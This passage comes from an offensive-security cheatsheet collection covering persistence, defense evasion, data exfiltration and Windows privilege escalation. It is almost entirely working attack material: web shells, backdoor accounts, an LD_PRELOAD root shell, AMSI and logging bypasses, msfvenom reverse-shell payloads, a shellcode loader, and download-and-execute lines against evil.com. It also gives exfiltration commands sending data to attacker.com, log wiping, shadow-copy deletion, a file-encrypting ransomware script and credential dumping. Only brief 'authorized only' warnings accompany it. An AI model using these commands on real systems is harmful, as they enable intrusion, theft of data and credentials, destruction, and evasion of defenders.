mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt
```

### Silver Ticket
```powershell
# Create ticket for specific service
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

---

## 🔴 Attack Methodology — 📊 Quick Reference

### Lateral Movement Techniques

| Technique | Port | Tool |
|-----------|------|------|
| PSExec | 445/SMB | impacket, metasploit |
| WMIExec | 135/WMI | impacket |
| WinRM | 5985/5986 | evil-winrm |
| RDP | 3389 | xfreerdp |
| SSH | 22 | ssh |
| DCOM | 135+ | impacket |

### Required Credentials

| Method | Requirement |
|--------|-------------|
| Pass-the-Hash | NTLM hash |
| Pass-the-Ticket | Kerberos ticket |
| PSExec | Admin + SMB access |
| WinRM | WinRM enabled + Admin |
| RDP | RDP enabled + RDP group |

---

## 🔴 Attack Methodology — 🔗 Related Cheatsheets

- [Impacket](../Impacket/README.md)
- [CrackMapExec](../CrackMapExec/README.md)
- [Evil-WinRM](../Evil-WinRM/README.md)
- [Mimikatz](../Mimikatz/README.md)
- [Rubeus](../Rubeus/README.md)

---

**Previous Phase:** [← 03 - Privilege Escalation](./03-Privilege-Escalation.md)

**Next Phase:** [05 - Persistence →](./05-Persistence.md)

## 🔴 Attack Methodology — # 🔒 Phase 5: Persistence

```
  ██████╗ ███████╗██████╗ ███████╗██╗███████╗████████╗███████╗███╗   ██╗ ██████╗███████╗
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██████╔╝█████╗  ██████╔╝███████╗██║███████╗   ██║   █████╗  ██╔██╗ ██║██║     █████╗  
  ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║██║     ██╔══╝  
  ██║     ███████╗██║  ██║███████║██║███████║   ██║   ███████╗██║ ╚████║╚██████╗███████╗
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
```

**Goal:** Maintain access to the compromised system even after reboots or detection.

---

## 🔴 Attack Methodology — 🖥️ Windows Persistence

### Scheduled Tasks
```cmd
# Create scheduled task (runs as SYSTEM)
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\shell.exe" /sc onlogon /ru SYSTEM

# With specific user
schtasks /create /tn "Updater" /tr "powershell -ep bypass -w hidden -c IEX(payload)" /sc onlogon /ru username

# On startup
schtasks /create /tn "Maintenance" /tr "C:\temp\beacon.exe" /sc onstart /ru SYSTEM

# Every hour
schtasks /create /tn "Sync" /tr "C:\temp\shell.exe" /sc hourly /mo 1

# List tasks
schtasks /query /fo LIST /v

# Delete task
schtasks /delete /tn "TaskName" /f
```

### Registry Run Keys
```cmd
# HKCU - Current user (no admin needed)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\temp\shell.exe"

# HKLM - All users (admin required)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsService" /t REG_SZ /d "C:\Windows\Temp\beacon.exe"

# RunOnce (executes once then deletes)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "powershell -c IEX(payload)"

# PowerShell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\temp\shell.exe"
```

### Startup Folder
```cmd
# Current user
copy shell.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# All users (admin required)
copy shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"

# PowerShell
Copy-Item shell.exe -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### Services
```cmd
# Create service (admin required)
sc create EvilService binPath= "C:\temp\shell.exe" start= auto
sc start EvilService

# Modify existing service
sc config VulnService binPath= "C:\temp\shell.exe"

# PowerShell
New-Service -Name "WindowsHelper" -BinaryPathName "C:\temp\beacon.exe" -StartupType Automatic
Start-Service WindowsHelper
```

### WMI Event Subscriptions
```powershell
# Create WMI persistence
$FilterArgs = @{
    Name = 'EvilFilter'
    EventNameSpace = 'root\CimV2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12 AND TargetInstance.Minute = 00"
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = 'EvilConsumer'
    CommandLineTemplate = 'C:\temp\shell.exe'
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

### DLL Hijacking / Search Order
```cmd
# Find DLL hijack opportunities
# Place malicious DLL in application directory
# Common targets:
# - Program files without full DLL paths
# - Missing DLLs

# Create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### COM Hijacking
```powershell
# Find COM objects
reg query "HKCU\Software\Classes\CLSID" /s /f "InprocServer32"

# Create hijack
New-Item -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Name "(Default)" -Value "C:\temp\evil.dll"
```

### Golden/Silver Ticket
```powershell
# Golden ticket - persistent domain admin
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Silver ticket - persistent service access
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:HASH /ptt
```

---

## 🔴 Attack Methodology — 🐧 Linux Persistence

### Cron Jobs
```bash
# User crontab
crontab -e
# Add: * * * * * /tmp/shell.sh

# System crontab
echo "* * * * * root /tmp/shell" >> /etc/crontab

# Cron directories
echo "#!/bin/bash\n/tmp/shell" > /etc/cron.hourly/update
chmod +x /etc/cron.hourly/update
```

### SSH Keys
```bash
# Add your public key to authorized_keys
echo "ssh-rsa AAAA...your_key... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Root access
echo "ssh-rsa AAAA...your_key..." >> /root/.ssh/authorized_keys
```

### Backdoor User
```bash
# Add user with root privileges
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
echo "backdoor:password" | chpasswd

# Or add to /etc/passwd directly
echo 'backdoor:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd
```

### SUID Binary
```bash
# Copy bash and set SUID
cp /bin/bash /tmp/.hidden
chmod u+s /tmp/.hidden

# Execute as root
/tmp/.hidden -p
```

### Systemd Service
```bash
# Create service file
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service

[Service]
Type=simple
ExecStart=/tmp/shell
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
systemctl daemon-reload
systemctl enable backdoor
systemctl start backdoor
```

### bashrc / profile
```bash
# Add to user's bashrc
echo '/tmp/shell &' >> ~/.bashrc

# Add to global profile
echo '/tmp/shell &' >> /etc/profile

# Add to bash_profile
echo '/tmp/shell &' >> ~/.bash_profile
```

### LD_PRELOAD
```bash
# Create malicious shared library
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# Add to LD_PRELOAD
echo "/tmp/evil.so" >> /etc/ld.so.preload
```

### Web Shell
```bash
# PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/.shell.php

# More hidden
echo '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' > /var/www/html/wp-includes/.config.php
```

---

## 🔴 Attack Methodology — 🌐 Web Persistence

### Web Shell Locations
```bash
# Common web shell locations
/var/www/html/.shell.php
/var/www/html/wp-content/uploads/.shell.php
/var/www/html/images/.shell.jpg.php
C:\inetpub\wwwroot\.shell.aspx
C:\inetpub\wwwroot\App_Data\shell.aspx
```

### ASP.NET Web Shell
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
%>
```

---

## 🔴 Attack Methodology — 📊 Quick Reference

### Windows Persistence Methods

| Method | Location | Privilege |
|--------|----------|-----------|
| Registry Run | HKCU/HKLM | User/Admin |
| Scheduled Task | Task Scheduler | User/Admin |
| Startup Folder | AppData/ProgramData | User/Admin |
| Service | Services | Admin |
| WMI | WMI Subscription | Admin |
| COM Hijack | HKCU CLSID | User |

### Linux Persistence Methods

| Method | Location | Privilege |
|--------|----------|-----------|
| Cron | /etc/crontab | root |
| SSH Keys | ~/.ssh/authorized_keys | User |
| SUID | Binary with +s | root |
| Systemd | /etc/systemd/system | root |
| bashrc | ~/.bashrc | User |

---

## 🔴 Attack Methodology — 🔗 Related Cheatsheets

- [PowerShell](../PowerShell/README.md)
- [Linux Commands](../Linux-Commands/README.md)
- [Metasploit](../Metasploit/README.md)

---

**Previous Phase:** [← 04 - Lateral Movement](./04-Lateral-Movement.md)

**Next Phase:** [06 - Defense Evasion →](./06-Defense-Evasion.md)

## 🔴 Attack Methodology — # 🛡️ Phase 6: Defense Evasion

```
  ██████╗ ███████╗███████╗███████╗███╗   ██╗███████╗███████╗
  ██╔══██╗██╔════╝██╔════╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██║  ██║█████╗  █████╗  █████╗  ██╔██╗ ██║███████╗█████╗  
  ██║  ██║██╔══╝  ██╔══╝  ██╔══╝  ██║╚██╗██║╚════██║██╔══╝  
  ██████╔╝███████╗██║     ███████╗██║ ╚████║███████║███████╗
  ╚═════╝ ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝
        ███████╗██╗   ██╗ █████╗ ███████╗██╗ ██████╗ ███╗   ██╗
        ██╔════╝██║   ██║██╔══██╗██╔════╝██║██╔═══██╗████╗  ██║
        █████╗  ██║   ██║███████║███████╗██║██║   ██║██╔██╗ ██║
        ██╔══╝  ╚██╗ ██╔╝██╔══██║╚════██║██║██║   ██║██║╚██╗██║
        ███████╗ ╚████╔╝ ██║  ██║███████║██║╚██████╔╝██║ ╚████║
        ╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

**Goal:** Bypass security controls (AV, EDR, AMSI, firewalls) to avoid detection.

---

## 🔴 Attack Methodology — 🛡️ Windows Defender Evasion

### Disable Windows Defender (Requires Admin)
```powershell
# Disable real-time monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable all Defender features
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableScriptScanning $true

# Add exclusion paths
Add-MpPreference -ExclusionPath "C:\temp"
Add-MpPreference -ExclusionProcess "powershell.exe"

# Via Registry
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

### Check Defender Status
```powershell
Get-MpComputerStatus
Get-MpPreference
```

---

## 🔴 Attack Methodology — 🔓 AMSI Bypass

### PowerShell AMSI Bypass
```powershell
# Bypass 1 - amsiInitFailed
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Bypass 2 - Matt Graeber's one-liner
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)

# Bypass 3 - Memory patching
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

### Obfuscated AMSI Bypass
```powershell
# String obfuscation
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0telekinetic1}{2}i{3}' -f $a,$b,$u))
$field = $assembly.GetField(('a]ot>m]ot>siInitFailed' -replace ']ot>',''),'NonPublic,Static')
$field.SetValue($null,$true)
```

---

## 🔴 Attack Methodology — 📦 Payload Obfuscation

### PowerShell Obfuscation
```powershell
# Base64 encoding
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded

# String concatenation
$a = 'Down'; $b = 'loadString'
(New-Object Net.WebClient)."$a$b"('http://evil.com/payload.ps1') | IEX

# Invoke-Obfuscation
Invoke-Obfuscation -ScriptPath payload.ps1 -Command 'TOKEN\ALL\1' -Quiet
```

### Binary Obfuscation
```bash
# msfvenom encoding
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe > payload.exe

# Custom XOR
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw | python3 xor_encrypt.py > payload.bin

# Shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe
```

### Shellcode Loaders
```c
// Simple shellcode loader in C
unsigned char shellcode[] = "\xfc\x48\x83...";

int main() {
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}
```

---

## 🔴 Attack Methodology — 🎭 Living Off The Land (LOLBins)

### Download & Execute
```cmd
# certutil
certutil -urlcache -split -f http://evil.com/payload.exe C:\temp\payload.exe
certutil -decode encoded.txt payload.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://evil.com/payload.exe C:\temp\payload.exe

# curl (Windows 10+)
curl http://evil.com/payload.exe -o C:\temp\payload.exe

# PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://evil.com/payload.exe','C:\temp\payload.exe')"
Invoke-WebRequest http://evil.com/payload.exe -OutFile C:\temp\payload.exe
```

### Execute Payloads
```cmd
# rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -c IEX(payload)")

# mshta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c IEX(payload)"", 0:close")
mshta http://evil.com/payload.hta

# regsvr32
regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll

# wmic
wmic process call create "powershell -ep bypass -c IEX(payload)"

# msiexec
msiexec /q /i http://evil.com/payload.msi
```

### AppLocker/WDAC Bypass
```cmd
# installutil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# regasm
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# msbuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
```

---

## 🔴 Attack Methodology — 🔒 ETW/Logging Bypass

### Disable Event Tracing
```powershell
# Patch ETW
$patch = @"
using System;
using System.Runtime.InteropServices;
public class Etw {
    [DllImport("ntdll.dll")]
    public static extern int EtwEventWrite(long x, long y, long z, long q);
}
"@
Add-Type $patch
```

### Clear Event Logs
```powershell
# Clear all logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"

# PowerShell
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }

# Or disable logging
auditpol /clear /y
```

### Disable PowerShell Logging
```powershell
# Disable Script Block Logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

# Disable Module Logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0
```

---

## 🔴 Attack Methodology — 🐧 Linux Evasion

### Timestomping
```bash
# Change file timestamps
touch -r /etc/passwd malicious.sh
touch -d "2020-01-01 12:00:00" malicious.sh
```

### Clear Logs
```bash
# Clear bash history
history -c
cat /dev/null > ~/.bash_history
export HISTSIZE=0
unset HISTFILE

# Clear system logs
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
echo > /var/log/messages
```

### Process Hiding
```bash
# Hide process name
exec -a "[kworker/0:0]" ./malicious

# LD_PRELOAD hiding
# Compile library that hooks readdir() to hide processes
```

---

## 🔴 Attack Methodology — 🛠️ Tools

| Tool | Purpose |
|------|---------|
| **Invoke-Obfuscation** | PowerShell obfuscation |
| **Veil** | Payload generation |
| **ScareCrow** | EDR bypass payload generator |
| **Donut** | Shellcode generator |
| **Nimcrypt2** | PE packer |
| **PEzor** | PE shellcode loader |

---

## 🔴 Attack Methodology — 📊 Quick Reference

### Detection Methods & Bypass

| Detection | Bypass Technique |
|-----------|------------------|
| Signature-based | Obfuscation, encoding |
| AMSI | Memory patching, bypass scripts |
| ETW | ETW patching |
| Logging | Disable logging, clear logs |
| AppLocker | LOLBins, bypass paths |
| Behavior | Living off the land |

### LOLBins Quick List

| Binary | Use |
|--------|-----|
| certutil | Download files |
| bitsadmin | Download files |
| mshta | Execute HTA |
| rundll32 | Execute DLL/JS |
| regsvr32 | Execute SCT |
| msbuild | Execute XML |
| installutil | Execute EXE |

---

## 🔴 Attack Methodology — 🔗 Related Cheatsheets

- [PowerShell](../PowerShell/README.md)
- [Mimikatz](../Mimikatz/README.md)

---

**Previous Phase:** [← 05 - Persistence](./05-Persistence.md)

**Next Phase:** [07 - Actions on Objectives →](./07-Actions-Objectives.md)

## 🔴 Attack Methodology — # 🎯 Phase 7: Actions on Objectives

```
   █████╗  ██████╗████████╗██╗ ██████╗ ███╗   ██╗███████╗     ██████╗ ███╗   ██╗
  ██╔══██╗██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝    ██╔═══██╗████╗  ██║
  ███████║██║        ██║   ██║██║   ██║██╔██╗ ██║███████╗    ██║   ██║██╔██╗ ██║
  ██╔══██║██║        ██║   ██║██║   ██║██║╚██╗██║╚════██║    ██║   ██║██║╚██╗██║
  ██║  ██║╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║███████║    ╚██████╔╝██║ ╚████║
  ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝     ╚═════╝ ╚═╝  ╚═══╝
         ██████╗ ██████╗      ██╗███████╗ ██████╗████████╗██╗██╗   ██╗███████╗███████╗
        ██╔═══██╗██╔══██╗     ██║██╔════╝██╔════╝╚══██╔══╝██║██║   ██║██╔════╝██╔════╝
        ██║   ██║██████╔╝     ██║█████╗  ██║        ██║   ██║██║   ██║█████╗  ███████╗
        ██║   ██║██╔══██╗██   ██║██╔══╝  ██║        ██║   ██║╚██╗ ██╔╝██╔══╝  ╚════██║
        ╚██████╔╝██████╔╝╚█████╔╝███████╗╚██████╗   ██║   ██║ ╚████╔╝ ███████╗███████║
         ╚═════╝ ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝╚══════╝
```

**Goal:** Achieve the final objective - data exfiltration, destruction, or other impact.

---

## 🔴 Attack Methodology — 📤 Data Exfiltration

### Finding Sensitive Data

#### Windows
```cmd
# Search for sensitive files
dir /s /b *password* *credential* *secret* *.kdbx *.key
dir /s /b *.doc* *.xls* *.pdf *.txt *.config

# Find files modified recently
forfiles /P C:\ /S /D +01/01/2024 /C "cmd /c echo @path"

# PowerShell - search by content
Get-ChildItem -Recurse | Select-String -Pattern "password" -List | Select Path
Get-ChildItem -Path C:\ -Include *.txt,*.doc*,*.xls* -Recurse -ErrorAction SilentlyContinue
```

#### Linux
```bash
# Search for sensitive files
find / -name "*password*" -o -name "*.key" -o -name "*.pem" 2>/dev/null
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password"

# Recent files
find / -mtime -7 -type f 2>/dev/null

# Large files
find / -size +100M -type f 2>/dev/null
```

### Compress & Stage Data

#### Windows
```powershell
# PowerShell - Create ZIP
Compress-Archive -Path C:\Sensitive -DestinationPath C:\temp\data.zip

# 7-Zip
7z a -p"password" data.7z C:\Sensitive\*

# Tar with compression
tar -cvzf data.tar.gz C:\Sensitive\
```

#### Linux
```bash
# Create compressed archive
tar -cvzf /tmp/data.tar.gz /home/user/sensitive/

# With encryption
tar -cvzf - /sensitive | openssl enc -aes-256-cbc -e > data.tar.gz.enc

# ZIP with password
zip -r -e data.zip /sensitive/
```

### Exfiltration Methods

#### HTTP/HTTPS
```bash
# Upload via curl
curl -X POST -F "file=@/tmp/data.zip" http://attacker.com/upload.php

# Base64 via GET (small data)
base64 /tmp/data.zip | curl -d @- http://attacker.com/receive

# PowerShell upload
$bytes = [IO.File]::ReadAllBytes("C:\temp\data.zip")
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -Body $bytes
```

#### DNS Exfiltration
```bash
# Encode data in DNS queries
cat /tmp/data | xxd -p | while read line; do nslookup $line.attacker.com; done

# Using dnscat2
dnscat2 attacker.com

# DNSExfiltrator
python dnsexfiltrator.py -d attacker.com -f data.zip
```

#### ICMP
```bash
# Exfil via ping
xxd -p -c 4 data.zip | while read line; do ping -c 1 -p $line attacker.com; done

# Using icmpsh
python icmpsh_m.py ATTACKER_IP VICTIM_IP
```

#### SMB
```bash
# Copy to attacker share
copy C:\Sensitive\data.zip \\attacker_ip\share\

# Mount and copy (Linux)
smbclient //attacker_ip/share -U user -c "put data.zip"
```

#### Cloud Services
```bash
# AWS S3
aws s3 cp data.zip s3://bucket-name/

# Azure Blob
az storage blob upload --file data.zip --container-name mycontainer --name data.zip

# Google Cloud
gsutil cp data.zip gs://bucket-name/
```

---

## 🔴 Attack Methodology — 💣 Destructive Actions (Ransomware Simulation)

> ⚠️ **WARNING:** Only for authorized red team engagements!

### Encryption Simulation
```powershell
# PowerShell - Encrypt files (simulation)
$key = [System.Text.Encoding]::UTF8.GetBytes("0123456789ABCDEF")
$files = Get-ChildItem -Path C:\TestData -Recurse -File
foreach ($file in $files) {
    $content = Get-Content $file.FullName -Raw
    $encrypted = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes($content), $key, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    Set-Content "$($file.FullName).encrypted" $encrypted
    Remove-Item $file.FullName
}
```

### Volume Shadow Copy Deletion
```cmd
# Delete shadow copies (prevents recovery)
vssadmin delete shadows /all /quiet
wmic shadowcopy delete

# Disable shadow copies
vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB
```

---

## 🔴 Attack Methodology — 🔐 Credential Harvesting

### Windows Credentials
```powershell
# Mimikatz - All credentials
mimikatz# sekurlsa::logonpasswords

# Dump SAM database
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
mimikatz# lsadump::sam /sam:SAM /system:SYSTEM

# LSASS dump
procdump -ma lsass.exe lsass.dmp
mimikatz# sekurlsa::minidump lsass.dmp

# Extract from dump
pypykatz lsa minidump lsass.dmp
```

### Linux Credentials
```bash
# Shadow file
cat /etc/shadow

# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history

# Config files
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null
```

### Browser Credentials
```bash
# Chrome credentials (Windows)
# Location: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

# Firefox credentials (Windows)
# Location: %APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json

# LaZagne - All browser passwords
python laZagne.py all
```

---

## 🔴 Attack Methodology — 🖥️ System Impact

### Denial of Service
```bash
# Fork bomb (Linux) - DON'T RUN!
:(){ :|:& };:

# Fill disk
dd if=/dev/zero of=/tmp/fill bs=1M count=100000

# CPU exhaustion
yes > /dev/null &
```

### Account Manipulation
```bash
# Change all user passwords
net user administrator NewP@ssw0rd!

# Lock accounts
net user username /active:no

# Delete users
net user username /delete
```

### Service Disruption
```cmd
# Stop critical services
net stop "DNS Server"
net stop "Active Directory Domain Services"

# Disable services
sc config wuauserv start= disabled
```

---

## 🔴 Attack Methodology — 📊 Quick Reference

### Exfiltration Methods

| Method | Pros | Cons |
|--------|------|------|
| HTTP/HTTPS | Common traffic, encrypted | May be monitored |
| DNS | Often unmonitored | Slow, size limits |
| ICMP | May bypass firewalls | Very slow |
| SMB | Fast, native | Internal only |
| Cloud | Legitimate services | Requires creds |

### Data Location Priorities

| Location | Value |
|----------|-------|
| Domain Controller | Highest - AD credentials |
| File Servers | High - Documents |
| Email Servers | High - Communications |
| Database Servers | High - Business data |
| Development Servers | Medium - Source code |
| User Workstations | Medium - Local files |

---

## 🔴 Attack Methodology — ✅ Pentest Report Checklist

```markdown
- [ ] Document all compromised systems
- [ ] List all discovered credentials
- [ ] Map attack path from initial access
- [ ] Document vulnerabilities exploited
- [ ] Note sensitive data locations found
- [ ] Provide remediation recommendations
- [ ] Include timeline of activities
- [ ] Screenshot evidence of access
```

---

## 🔴 Attack Methodology — 🔗 Related Cheatsheets

- [Mimikatz](../Mimikatz/README.md)
- [Linux Commands](../Linux-Commands/README.md)
- [PowerShell](../PowerShell/README.md)

---

**Previous Phase:** [← 06 - Defense Evasion](./06-Defense-Evasion.md)

**Back to Overview:** [🎯 Kill Chain Overview](./README.md)

---

<p align="center">
  <b>🎯 Mission Complete!</b><br>
  <i>Remember: Only perform these actions with proper authorization!</i>
</p>

## 🖥 Windows PrivEsc — # 🪟 Windows Privilege Escalation - Complete Cheatsheet

```
  ██╗    ██╗██╗███╗   ██╗██████╗  ██████╗ ██╗    ██╗███████╗
  ██║    ██║██║████╗  ██║██╔══██╗██╔═══██╗██║    ██║██╔════╝
  ██║ █╗ ██║██║██╔██╗ ██║██║  ██║██║   ██║██║ █╗ ██║███████╗
  ██║███╗██║██║██║╚██╗██║██║  ██║██║   ██║██║███╗██║╚════██║
  ╚███╔███╔╝██║██║ ╚████║██████╔╝╚██████╔╝╚███╔███╔╝███████║
   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚══════╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Windows-PrivEsc-blue?style=for-the-badge" alt="Windows PrivEsc">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Post Exploitation">
  <img src="https://img.shields.io/badge/SYSTEM-Access-red?style=for-the-badge" alt="SYSTEM">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Complete guide to escalating privileges on Windows systems</b>
</p>

---

## 🖥 Windows PrivEsc — 📋 Table of Contents

- [Enumeration](#-enumeration)
- [Service Exploitation](#-service-exploitation)
- [Unquoted Service Paths](#-unquoted-service-paths)
- [DLL Hijacking](#-dll-hijacking)
- [AlwaysInstallElevated](#-alwaysinstallelevated)
- [Stored Credentials](#-stored-credentials)
- [Token Manipulation](#-token-manipulation)
- [Potato Attacks](#-potato-attacks)
- [Registry Exploits](#-registry-exploits)
- [Scheduled Tasks](#-scheduled-tasks)
- [UAC Bypass](#-uac-bypass)
- [Kernel Exploits](#-kernel-exploits)
- [Quick Reference](#-quick-reference)

---

## 🖥 Windows PrivEsc — 🔍 Enumeration

### System Information

```cmd
# System info
systeminfo
hostname

# OS version
ver
wmic os get caption,version,buildnumber

# Architecture
echo %PROCESSOR_ARCHITECTURE%

# Patches/Hotfixes
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### User Information

```cmd
# Current user
whoami
whoami /all
whoami /priv
whoami /groups

# All users
net user
net localgroup administrators

# User details
net user username

# Current privileges
whoami /priv
```

### Network Information

```cmd
# IP config
ipconfig /all

# Routes
route print

# Open ports
netstat -ano
